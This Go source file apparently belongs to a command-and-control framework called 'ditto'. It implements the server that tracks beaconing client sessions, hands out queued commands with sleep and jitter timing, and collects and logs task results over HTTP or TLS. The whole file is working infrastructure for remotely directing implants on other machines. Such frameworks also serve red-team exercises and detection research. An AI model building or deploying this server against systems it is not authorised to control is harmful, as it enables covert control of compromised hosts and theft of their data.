package transport

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"time"

	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/tasks"
)

// Server handles C2 server operations
type Server struct {
	config     *core.Config
	logger     interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
	sessions   map[string]*Session
	sessionsMu sync.RWMutex
	handler    *http.ServeMux
	server     *http.Server
	taskQueue  *tasks.Queue
}

// Session represents a client session
type Session struct {
	ID          string
	RemoteAddr  string
	ConnectedAt time.Time
	LastSeen    time.Time
	Metadata    map[string]interface{}
}

// NewServer creates a new C2 server with its own task queue
func NewServer(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *Server {
	return NewServerWithTaskQueue(config, logger, tasks.NewQueue(1000))
}

// NewServerWithTaskQueue creates a new C2 server with a shared task queue
func NewServerWithTaskQueue(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}, taskQueue *tasks.Queue) *Server {
	s := &Server{
		config:    config,
		logger:    logger,
		sessions:  make(map[string]*Session),
		handler:   http.NewServeMux(),
		taskQueue: taskQueue,
	}
	
	s.setupRoutes()
	return s
}

func (s *Server) setupRoutes() {
	// Beacon endpoint
	s.handler.HandleFunc("/beacon", s.handleBeacon)
	
	// Task endpoint
	s.handler.HandleFunc("/task", s.handleTask)
	
	// Result endpoint
	s.handler.HandleFunc("/result", s.handleResult)
	
	// Health check
	s.handler.HandleFunc("/health", s.handleHealth)
}

// Start starts the C2 server
func (s *Server) Start(listenAddr string) error {
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
	}
	
	s.server = &http.Server{
		Addr:         listenAddr,
		Handler:      s.handler,
		TLSConfig:    tlsConfig,
		ReadTimeout:  s.config.Server.ReadTimeout,
		WriteTimeout: s.config.Server.WriteTimeout,
		IdleTimeout:  s.config.Server.KeepAlive,
	}
	
	s.logger.Info("Starting C2 server on %s", listenAddr)
	
	if s.config.Server.TLSEnabled {
		return s.server.ListenAndServeTLS(
			s.config.Server.TLSCertPath,
			s.config.Server.TLSKeyPath,
		)
	}
	
	return s.server.ListenAndServe()
}

func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		sessionID = generateSessionID()
	}
	
	s.sessionsMu.Lock()
	session, exists := s.sessions[sessionID]
	if !exists {
		session = &Session{
			ID:          sessionID,
			RemoteAddr:  r.RemoteAddr,
			ConnectedAt: time.Now(),
			LastSeen:    time.Now(),
			Metadata:    make(map[string]interface{}),
		}
		s.sessions[sessionID] = session
		s.logger.Info("New session: %s from %s", sessionID, r.RemoteAddr)
	} else {
		session.LastSeen = time.Now()
	}
	s.sessionsMu.Unlock()
	
	// Read client metadata
	var metadata map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&metadata); err == nil {
		session.Metadata = metadata
	}
	
	// Return any pending tasks
	tasks := s.getPendingTasks(sessionID)
	
	response := map[string]interface{}{
		"session_id": sessionID,
		"tasks":      tasks,
		"sleep":      s.config.Communication.Sleep.Seconds(),
		"jitter":     s.config.Communication.Jitter,
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	tasks := s.getPendingTasks(sessionID)
	
	// Mark tasks as in-progress and schedule removal
	for _, taskMap := range tasks {
		if taskID, ok := taskMap["id"].(string); ok {
			if s.taskQueue != nil {
				s.taskQueue.UpdateStatus(taskID, "in_progress")
				// Remove task after completion timeout (30 seconds)
				go func(id string) {
					time.Sleep(30 * time.Second)
					if task := s.taskQueue.Get(id); task != nil && task.Status == "in_progress" {
						s.taskQueue.Remove(id)
					}
				}(taskID)
			}
		}
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"tasks": tasks,
	})
}

func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	var result map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	
	// Update task status and remove after completion
	if taskID, ok := result["task_id"].(string); ok {
		if s.taskQueue != nil {
			s.taskQueue.SetResult(taskID, result)
			// Remove task after a short delay to allow result processing
			go func() {
				time.Sleep(5 * time.Second)
				s.taskQueue.Remove(taskID)
			}()
		}
	}
	
	s.logger.Info("Task result from session %s: %v", sessionID, result)
	
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
	pending := s.taskQueue.GetPending()
	tasks := make([]map[string]interface{}, 0, len(pending))
	
	for _, task := range pending {
		// Filter tasks by session if specified in parameters
		if task.Parameters != nil {
			if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
				if taskSessionID != sessionID {
					continue
				}
			}
		}
		
		tasks = append(tasks, map[string]interface{}{
			"id":         task.ID,
			"type":       task.Type,
			"command":    task.Command,
			"parameters": task.Parameters,
		})
	}
	
	return tasks
}

func generateSessionID() string {
	return fmt.Sprintf("sess-%d", time.Now().UnixNano())
}

// EnqueueTask adds a task to the queue for a specific session
func (s *Server) EnqueueTask(task *tasks.Task) error {
	return s.taskQueue.Add(task)
}

// GetSessions returns all active sessions
func (s *Server) GetSessions() map[string]*Session {
	s.sessionsMu.RLock()
	defer s.sessionsMu.RUnlock()
	
	// Create a copy to avoid race conditions
	sessions := make(map[string]*Session, len(s.sessions))
	for id, session := range s.sessions {
		sessions[id] = session
	}
	return sessions
}

// Stop stops the C2 server
func (s *Server) Stop() error {
	if s.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		return s.server.Shutdown(ctx)
	}
	return nil
}

